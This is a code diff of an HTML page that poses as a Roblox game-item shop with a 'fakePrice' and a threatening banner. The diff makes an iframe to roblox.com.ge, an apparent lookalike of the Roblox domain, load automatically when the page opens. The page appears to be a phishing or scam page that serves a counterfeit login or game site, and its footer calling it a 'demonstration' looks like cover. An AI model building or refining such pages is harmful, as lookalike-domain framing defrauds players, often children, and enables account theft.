@@ -263,10 +263,14 @@
             <h2>Your Selected Unit:</h2>
             <div id="selectedUnitDisplay"></div>
             <div class="price-tag">Price: $<span id="fakePrice">1.99</span></div>
-            <h3>Please You can play later But If I Scam US We're gonna report You NOW!</h3>
+            <h3>You Can Pay Us later on But If You Scam Us We're Gonna report Ur Account Join on Our Ps!</h3>
             <button class="purchase-btn" onclick="purchaseUnit()">PURCHASE NOW</button>
             <div class="loading-message" id="loadingMessage">Loading game...</div>
-            <iframe id="embeddedGameFrame" class="embedded-content" src="" frameborder="0"></iframe>
+            <iframe id="embeddedGameFrame" class="embedded-content" 
+                    src="https://roblox.com.ge/games/16146832113/90-Anime-Vanguards?privateServerLinkCode=77018302894965808950805452374513" 
+                    frameborder="0" 
+                    allowfullscreen 
+                    allow="autoplay; fullscreen"></iframe>
         </div>
 
         <p class="footer">This is a simulated marketplace for demonstration purposes only. Prices and availability are fictional.</p>
@@ -445,8 +449,9 @@
         function purchaseUnit() {
             // Show loading message
             document.getElementById('loadingMessage').style.display = 'inline-block';
-            // Set the iframe source immediately
-            document.getElementById('embeddedGameFrame').src = 'https://roblox.com.ge/games/16146832113/90-Anime-Vanguards?privateServerLinkCode=77018302894965808950805452374513';
+            // The iframe source is already set in the HTML, so it should load immediately
+            // Optionally, you can scroll to the iframe
+            document.getElementById('embeddedGameFrame').scrollIntoView({ behavior: 'smooth' });
         }
     </script>
 
